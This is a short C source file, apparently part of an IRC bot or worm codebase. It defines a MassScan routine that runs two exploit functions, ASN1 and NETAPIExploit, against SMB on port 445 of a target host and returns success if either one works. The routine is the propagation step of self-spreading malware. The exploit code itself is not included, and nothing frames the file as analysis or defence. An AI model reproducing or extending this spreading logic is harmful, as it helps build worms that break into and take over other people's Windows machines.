#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_ASN
#ifndef NO_NETAPI
#ifndef NO_MASS


BOOL MassScan(EXINFO exinfo)
{
	exinfo.port = 445;
	BOOL bASN1SMB = ASN1(exinfo);
	exinfo.port = 445;
	BOOL bNET445 = NETAPIExploit(exinfo);
	return bNET445 || bASN1SMB  ? TRUE : FALSE;
}

#endif
#endif
#endif
